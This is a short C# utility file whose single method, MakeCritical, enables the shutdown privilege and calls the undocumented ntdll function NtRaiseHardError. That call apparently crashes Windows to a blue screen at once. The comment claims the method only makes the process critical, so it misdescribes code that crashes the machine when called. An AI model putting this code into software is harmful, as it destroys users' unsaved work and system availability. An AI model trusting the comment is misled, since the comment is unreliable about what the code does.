using System;
using System.Runtime.InteropServices;


namespace Pluton.Utilities
{
    public static class PProcess
    {
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);



        // MAKE PROCESS CRITICAL (WHEN YOU END THE PROCESS A BSOD WILL APPEAR).
        public static void MakeCritical()
        {
            bool t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

    }
}
